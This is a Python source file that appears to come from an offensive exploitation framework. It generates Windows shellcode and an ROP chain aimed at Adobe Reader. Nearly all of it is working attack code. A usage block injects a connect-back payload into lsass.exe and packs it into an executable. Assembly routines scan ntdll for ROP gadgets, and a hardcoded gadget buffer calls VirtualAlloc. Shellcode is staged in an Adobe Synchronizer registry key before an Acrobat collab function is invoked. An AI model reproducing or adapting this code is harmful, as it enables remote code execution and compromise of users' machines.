#! /usr/bin/env python

# a more respectful payload generator for win32
import sys
if "." not in sys.path: sys.path.append(".")

from shellcode.standalone.windows.basecode import basecode
from shellcode.standalone.windows.basecode import s_to_push
from MOSDEF import mosdef
from MOSDEF import pelib
from exploitutils import *
import struct
import socket
import random
import time

import canvasengine

USAGE = """
To create a simple file with the shellcode its quite simple:

import shellcode.standalone.windows.payloads as payloads
p = payloads.payloads()
localhost = "172.16.193.1"
localport = 5555
sc = p.injectintoprocess( localhost, localport, target= "lsass.exe", 
load_winsock = True )
sc = p.assemble(sc)

print "Shellcode size: %x" % len(sc)
myPElib = pelib.PElib()
exe = myPElib.createPEFileBuf(sc, gui=True)
file = open('test.exe', 'wb+')
file.write(exe)
file.close()
"""

class payloads:
    def __init__(self, VirtualProtect=True, VistaCompat=True, module=None, dll=False):
        self.vprotect     = VirtualProtect
        self.vista_compat = VistaCompat
        self.module       = module # current module using the payload generator
        self.dll          = dll
    
    def get_basecode(self, **args):
        if self.vprotect: args["VirtualProtect"] = True
        if self.dll: args["dll"] = True
        return basecode(**args)

    def assemble(self, code):
        """
        just a little convenience callthrough to mosdef.assemble
        """
        return mosdef.assemble(code, 'X86')

    def create_shellcode(self,shellcode):
        codegen = self.get_basecode()
        #return codegen.get()
        #codegen.load_library('advapi32.dll')
        #codegen.find_function('user32.dll!MessageBoxA')        
        codegen.find_function('kernel32.dll!getmodulehandlea')
        codegen.find_function('kernel32.dll!virtualalloc')

        codegen.find_function('kernel32.dll!sleep')
        codegen.find_function('kernel32.dll!loadlibrarya')
        
        codegen.find_function('advapi32.dll!regcreatekeyexa')
        codegen.find_function('advapi32.dll!reggetvaluea')
        codegen.find_function('advapi32.dll!regsetvalueexa')
        codegen.find_function('advapi32.dll!regdeletevaluea')
        codegen.find_function('advapi32.dll!regclosekey')
        codegen.find_function('msvcrt.dll!memset')        
        
        codegen._globals.addString('BDELETEDB', 'bDeleteDB')
        codegen._globals.addString('SHELLCODEKEY', 'shellcode')
        codegen._globals.addString('PATH', 'Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\')
        codegen._globals.addString('ACROBAT', 'AcroRd32.exe')
        codegen._globals.addString('NTDLL', 'ntdll.dll')
        
        codegen._globals.addDword('KEY')
        codegen._globals.addDword('ACROBASE')
        codegen._globals.addDword('NTDLLBASE')
        codegen._globals.addDword('OFFSET')
        codegen._globals.addDword('COLLBASYNC_ARG')
        codegen._globals.addDword('POPEDI')
        codegen._globals.addDword('POPECX')
        codegen._globals.addDword('MOVEDIECX')

        codegen.main += """
        call main_handler
        """
        
        codegen.main += """
        // functions go here    
    sleep:
        push $0x1000
        call *SLEEP-getpcloc(%ebp)
        ret
        
    adobecollab:
        push %eax
        push %ecx
        
        movl ACROBASE-getpcloc(%ebp),%eax
        movl OFFSET-getpcloc(%ebp),%ecx
        addl %ecx,%eax
        movl COLLBASYNC_ARG-getpcloc(%ebp),%ecx        
        push %ecx
        
        call %eax
        popl %eax
        popl %ecx
        
        ret
        
    close_reg_key:
        push %edx
        movl KEY-getpcloc(%ebp),%edx
        push %edx
        call *REGCLOSEKEY-getpcloc(%ebp)
        popl %edx
        ret
        
    delete_reg_key:
        push %esi
        push %ebx
        push %edx
        
        movl KEY-getpcloc(%ebp),%edx
        leal BDELETEDB-getpcloc(%ebp),%ebx 
        push %ebx
        push %edx
        call *REGDELETEVALUEA-getpcloc(%ebp)
                
        movl KEY-getpcloc(%ebp),%edx
        leal SHELLCODEKEY-getpcloc(%ebp),%ebx 
        push %ebx
        push %edx
        call *REGDELETEVALUEA-getpcloc(%ebp)
        
        popl %esi  
        popl %edx
        popl %ebx  
        
        ret
        
    get_ntdll_base:
        push %esi
    
        leal NTDLL-getpcloc(%ebp),%esi
        pushl %esi
        call *LOADLIBRARYA-getpcloc(%ebp)
        movl %eax,NTDLLBASE-getpcloc(%ebp)
    
        popl %esi  
        ret
    
    get_acro_base:
        push %esi
        
        leal ACROBAT-getpcloc(%ebp),%esi
        pushl %esi
        call *GETMODULEHANDLEA-getpcloc(%ebp)
        movl %eax,ACROBASE-getpcloc(%ebp)
        
        popl %esi
        ret
        
    create_reg_key:

        pushl %ebx
        pushl %edx
        pushl %edi // +4
        pushl %esi // +8
        
        leal PATH-getpcloc(%ebp),%edi
        leal KEY-getpcloc(%ebp),%edx
        
        pushl $0           //      
        pushl %edx         //         
        pushl $0           //         
        pushl $0xF003F
        pushl $0           // 
        pushl $0           // 
        pushl $0           // 
        pushl %edi           // 
        pushl $0x80000001           // 
        call *REGCREATEKEYEXA-getpcloc(%ebp)
        
        popl %ebx
        popl %edx
        popl %edi // +4
        popl %esi // +8
        
        ret
        
    set_reg_key:
    
        pushl %ebx
        pushl %edx
        pushl %ecx
        
        movl KEY-getpcloc(%ebp),%edx
        leal BDELETEDB-getpcloc(%ebp),%ebx 
        leal BUFFER-getpcloc(%ebp),%ecx 
        pushl $0x400 //Buffer len      
        pushl %ecx    
        pushl $0       
        pushl $0       
        pushl %ebx            
        pushl %edx
        
        call *REGSETVALUEEXA-getpcloc(%ebp)
        
        //RegSetValueExA(key,"shellcode", 0, REG_BINARY,shellcode,sizeof(shellcode));
        movl KEY-getpcloc(%ebp),%edx        
        leal SHELLCODEKEY-getpcloc(%ebp),%ebx 
        leal SHELLCODE-getpcloc(%ebp),%ecx 
        pushl $0x3500   //Shellcode len    
        pushl %ecx    
        pushl $0       
        pushl $0       
        pushl %ebx            
        pushl %edx
        
        call *REGSETVALUEEXA-getpcloc(%ebp)
        
        popl %ebx
        popl %ecx        
        popl %edx
        ret
       
        get_mov_ret:
            pushl %esi
            pushl %eax
            leal NTDLLBASE-getpcloc(%ebp),%esi 
            movl (%esi),%esi
            
        mov_init:
            inc %esi
            movb (%esi),%al
            cmp $0x89,%al
            jnz mov_init
            
        mov_first_found:
            inc %esi
            movb (%esi),%al
            cmp $0x0f,%al
            jnz mov_init
            
        mov_second_found:
            inc %esi
            movb (%esi),%al
            cmp $0xc3,%al
            jnz mov_init            
            
        mov_found:
            dec %esi
            dec %esi            
            movl %esi,MOVEDIECX-getpcloc(%ebp)
            pop %eax
            pop %esi
            ret
            
        get_pop_edi_ret:
            pushl %esi
            pushl %eax
            leal NTDLLBASE-getpcloc(%ebp),%esi 
            movl (%esi),%esi
            
        pop_edi_init:
            inc %esi
            movb (%esi),%al
            cmp $0x5f,%al
            jnz pop_edi_init
            
        pop_edi_first_found:
            inc %esi
            movb (%esi),%al
            cmp $0xc3,%al
            jnz pop_edi_init
            
        pop_edi_found:
            dec %esi
            movl %esi,POPEDI-getpcloc(%ebp)
            pop %eax
            pop %esi
            ret
            
        get_pop_ecx_ret:
            pushl %esi
            pushl %eax
            leal NTDLLBASE-getpcloc(%ebp),%esi 
            movl (%esi),%esi
            
        pop_ecx_init:
            inc %esi
            movb (%esi),%al
            cmp $0x59,%al
            jnz pop_ecx_init
            
        pop_ecx_first_found:
            inc %esi
            movb (%esi),%al
            cmp $0xc3,%al
            jnz pop_ecx_init
            
        pop_ecx_found:
            dec %esi
            movl %esi,POPECX-getpcloc(%ebp)
            pop %eax
            pop %esi
            ret        
            
        fix_buffer_address:
            pushl %esi
            pushl %edx
            pushl %ebx
            
            leal BUFFER-getpcloc(%ebp),%esi
            leal 28(%esi),%esi
            movl POPECX-getpcloc(%ebp),%eax
            inc %eax
            movl %eax,(%esi)  
            
            leal 12(%esi),%esi
            movl *VIRTUALALLOC-getpcloc(%ebp),%ebx                
            movl  %ebx,(%esi)
            
            leal 4(%esi),%esi
            movl %eax,(%esi)  
            
            movl $0x12,%ecx
            leal 20(%esi),%esi
            
        loopa:
            movl POPEDI-getpcloc(%ebp),%eax
            movl %eax,(%esi)  
            
            leal 8(%esi),%esi
            movl POPECX-getpcloc(%ebp),%eax
            movl %eax,(%esi)  
            
            leal 8(%esi),%esi
            movl MOVEDIECX-getpcloc(%ebp),%eax
            movl %eax,(%esi)  
            
            leal 4(%esi),%esi
               
            dec %ecx
            jnz loopa
            
            movl *REGGETVALUEA-getpcloc(%ebp),%ebx                            
            movl %ebx,(%esi)              
            
            popl %esi
            popl %edx
            popl %ebx
            
            ret
            
        """
        
        codegen.main += """
    main_handler:
        //int3
        call get_ntdll_base
        call get_pop_edi_ret
        call get_pop_ecx_ret
        call get_mov_ret
        call fix_buffer_address
        call get_acro_base
        call create_reg_key
        call set_reg_key
        call adobecollab
        call sleep
        call delete_reg_key
        call close_reg_key                
        call sleep   
        push $41414141
        ret
        ret
        ret
        """
        
        buffer =  "\x58\x00\x00\x00"
        buffer += "\x58\x00\x00\x01"
        buffer += "\x00\x00\x00\x00" #Must be zero
        buffer += "\x58\x00\x00\x02"
        buffer += "\x58\x00\x00\x03"
        buffer += "\x58\x00\x00\x04"
        buffer += "\x58\x00\x00\x05"
        buffer += "\x22\x59\x00\x00" #gadget ret
        buffer += "\x58\x00\x00\x06"
        buffer += "\x58\x00\x00\x07"
        
        buffer += "\xCA\xFE\xCA\xFE"
        buffer += "\x22\x59\x00\x00" #gadget ret
        buffer += "\x00\x00\x60\x60"
        buffer += "\x00\x00\x01\x00"
        buffer += "\x00\x30\x00\x00"
        buffer += "\x40\x00\x00\x00"        
        
        # Copy "Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\\x00shellcode\x00\x00\xF0\x00\x00"
        # to the allocated memory

        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x00\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x53\x6f\x66\x74"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x04\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x77\x61\x72\x65"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x08\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x5c\x41\x64\x6f"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x0c\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x62\x65\x5c\x41"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x10\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x64\x6f\x62\x65"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x14\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x20\x53\x79\x6e"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x18\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x63\x68\x72\x6f"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x1c\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x6e\x69\x7a\x65"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x20\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x72\x5c\x31\x30"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x24\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x2e\x30\x5c\x44"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x28\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x42\x52\x65\x63"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x2c\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x6f\x76\x65\x72"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x30\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x79\x4f\x70\x74"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x34\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x69\x6f\x6e\x73"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x38\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x5c\x00\x73\x68"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x3c\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x65\x6c\x6c\x63"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x40\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x6f\x64\x65\x00"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret 
        buffer += "\xbc\x54\x03\x00" #gadget_pop_edi_ret 
        buffer += "\x44\x00\x60\x60"
        buffer += "\xa2\x73\x0b\x00" #gadget_pop_ecx_ret 
        buffer += "\x00\xf0\x00\x00"
        buffer += "\x09\x2d\x02\x00" #gadget_mov_dword_edi_ecx_ret

        
        buffer += "\xCA\xFE\xCA\xFE"
        buffer += "\x00\x10\x60\x60"
        buffer += "\x01\x00\x00\x80"
        buffer += "\x00\x00\x60\x60"
        buffer += "\x3a\x00\x60\x60"
        buffer += "\xff\xff\x00\x00"
        buffer += "\x00\x00\x00\x00"
        buffer += "\x00\x10\x60\x60"
        buffer += "\x44\x00\x60\x60"

        codegen.main += "BUFFER:\n"
        for c in buffer:
            codegen.main += '.byte 0x%.2x\n' % ord(c)
            
        codegen.main += "SHELLCODE:\n"
        for c in shellcode:
            codegen.main += '.byte 0x%.2x\n' % ord(c)
                
        return codegen.get()